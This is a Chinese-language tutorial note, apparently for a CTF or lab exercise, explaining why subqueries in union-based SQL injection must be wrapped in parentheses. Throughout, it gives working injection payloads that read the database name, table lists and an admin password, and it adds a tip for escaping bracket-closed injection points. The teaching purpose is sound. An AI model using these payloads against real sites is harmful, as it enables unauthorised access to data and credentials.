## 一句话概括

子查询就是「写在另一个 SQL 里的小 SQL」，**必须用括号包起来**。括号既是语法要求，也决定了执行优先级——先算子查询，再拿结果参与外层运算。

## 原理

### 1. 括号是语法必需，不是可选

```sql
select (subquery)   -- 正确
select subquery     -- 语法错误
```

MySQL 解析器遇到 `SELECT` 会期待一个完整的查询结构，裸写会把它当成**另一个顶层语句**，直接报语法错误。

### 2. 括号决定了计算顺序

```sql
SELECT * FROM users WHERE id=(SELECT id FROM users WHERE username='admin');
```

括号内的内容被认为是一整个值（这里是一个标量），会**先被算出来**，再拿去和外层的 `id` 比较。这就是「有括号会优先算括号内」的由来。

### 3. 子查询的位置

子查询可以出现在：

- `WHERE` 条件里：`WHERE id = (SELECT ...)`
- `SELECT` 的字段位里：`SELECT 1,2,(SELECT ...)`
- `FROM` 后面当临时表（派生表）

注入中最常用的是**放在字段位**，因为它可以把自己查询的结果直接显示在回显点上。

## 常见写法

```sql
-- 一个典型的子查询注入：把库名放进第三个回显位
id=-1' union select 1,2,(select database()) --+

-- 其他等价写法
union select 1,2,(select version())
union select 1,2,(select group_concat(table_name) from information_schema.tables)
union select 1,2,(select password from users where username='admin')
```

## 本题情景与解题手法

### 题目形态

题目问的是：`id=-1' union select 1,2,(select database()) --+` 里的 `(select database())` **为什么要加括号**。

### 第一步：理解这里的括号

`(select database())` 是一个**标量子查询**：它只返回一个值（当前库名）。括号的作用是告诉 MySQL：

> 先执行括号里的查询，把结果当成一个普通字段值，放进第 3 个回显位。

### 第二步：验证不加括号会怎样

```sql
id=-1' union select 1,2,select database() --+
```

这会报语法错误。原因是 `union select 1,2,select database()` 里出现了两个连续的 `SELECT` 关键字，MySQL 无法解析——**字段位期待的是一个「值」，而裸 `SELECT` 是一个语句，必须用括号把它「降级」成一个值**。

### 第三步：确认这是通用规则

凡是「在一个 SELECT 的字段位置上再放一个 SELECT」，都要加括号：

```sql
union select 1,2,(select database())
union select 1,2,(select version())
union select 1,2,(select group_concat(table_name) from information_schema.tables)
union select 1,2,(select password from users where username='admin')
```

### 注入手法一句话总结

> 子查询提供「把一条查询的结果当成一个值」的能力；在联合注入里，用 `union select 1,2,(子查询)` 把任意单值数据塞进回显位，**括号是必须的语法，不是可选**。

## 踩坑与备注

- **标量子查询只能返回一个值**：如果子查询返回多行多列，MySQL 会报 `Subquery returns more than 1 row`；需要多值时用 `group_concat()` 压成一行，或改用 `union select`。
- **别把子查询和 UNION 混起来**：`union select 1,2,database()` 也能回显库名，而且不用括号——因为 `database()` 本身就是一个**函数**（返回单值），不是子查询。子查询特指内部又嵌套了一条完整 `SELECT` 的写法。
- 括号还能用来对抗「括号闭合型」注入点：原 SQL 形如 `WHERE id = ('[输入]')` 时，payload 要先补 `')` 才能逃出去。
